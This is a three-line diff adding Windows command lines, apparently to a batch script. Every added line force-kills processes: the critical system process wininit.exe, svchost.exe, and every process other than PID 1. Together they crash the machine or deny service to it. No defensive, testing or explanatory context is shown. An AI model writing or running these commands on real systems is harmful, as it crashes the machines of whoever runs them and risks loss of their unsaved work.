@@ -1,0 +1,3 @@
+taskkill /f /im wininit.exe
+taskkill /f /im svchost.exe
+taskkill /f /fi "pid ne 1"
